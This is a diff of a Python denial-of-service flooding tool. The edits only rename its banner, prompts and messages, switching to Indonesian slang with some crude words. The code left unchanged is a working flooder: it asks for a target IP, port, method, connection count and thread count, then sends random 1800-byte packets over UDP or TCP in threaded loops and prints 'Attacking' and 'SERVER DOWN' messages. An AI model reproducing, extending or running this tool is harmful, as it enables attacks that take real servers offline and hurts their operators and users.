@@ -36,18 +36,24 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 
 os.system("clear")
 print("""
-░██████╗░██████╗░██╗███████╗███████╗██╗░░██╗
-██╔════╝░██╔══██╗██║╚════██║╚════██║╚██╗██╔╝
-██║░░██╗░██████╔╝██║░░███╔═╝░░███╔═╝░╚███╔╝░
-██║░░╚██╗██╔══██╗██║██╔══╝░░██╔══╝░░░██╔██╗░
-╚██████╔╝██║░░██║██║███████╗███████╗██╔╝╚██╗
-░╚═════╝░╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝""")
+_▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄
+───█▒▒░░░░░░░░░▒▒█───
+────█░░█░░░░░█░░█────
+─▄▄──█░░░▀█▀░░░█──▄▄─
+█░░█─▀▄░░░░░░░▄▀─█░░█
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█
+█    ▄▀▄ ──▀ █▀▀ █── █── ▀▄─▄▀
+█    █▀█ ▄─█ █▀▀ █─▄ █─▄ ──█──
+█    ▀─▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ──▀──
+█
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
 print("\033[0m")         
-ip = str(input("[ ====> ] HOST/IP: "))
+ip = str(input("[ ====> ] IPNYA SAYAANG: "))
 port = int(input("[ ====> ] PORT : "))
-choice = str(input("[ ====> ] Method UDP | TCP : "))
-times = int(input("[ ====> ] PACKETS : "))
-threads = int(input("[ ====> ] ISI PACKETS : "))
+choice = str(input("[ ====> ] Methodnya pilih UDP|TCP : "))
+times = int(input("[ ====> ] CONNECTIONS : "))
+threads = int(input("[ ====> ] THREAD : "))
 os.system("clear")
 def run():
 	data = random._urandom(1800)
@@ -58,10 +64,10 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM GRIZZ!!!")
+			print(i +" PACKETS FROM MbahJel")
 		except:
 			s.close()
-			print("[!] SERVER DOWN!!!")
+			print("[!] PROSES YA GANTENG!")
 
 def run2():
 	data = random._urandom(1800)
@@ -72,10 +78,10 @@ def run2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM GRIZZ!!!")
+			print(i +" PACKETS FROM MbahJel")
 		except:
 			s.close()
-			print("[!] SERVER DOWN!!!")
+			print("[!] PROSES YA GANTENG!")
 
 			
 def run3():
@@ -100,7 +106,7 @@ def run3():
             print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print('[+] SERVER DOWN!!!')
+            print('[+] PROSES YA GANTENG!')
 
 for x in range(threads):
     if choice == 'TCP':
@@ -155,7 +161,7 @@ def exit_gracefully(signum, frame):
     signal.signal(signal.SIGINT, original_sigint)
 
     try:
-        exitc = str(input(" Ngapain Close Lagi Lah <3 ?:"))
+        exitc = str(input(" Ngapain Close Lagi Gblk"))
         if exitc == 'y':
 
             byebye()
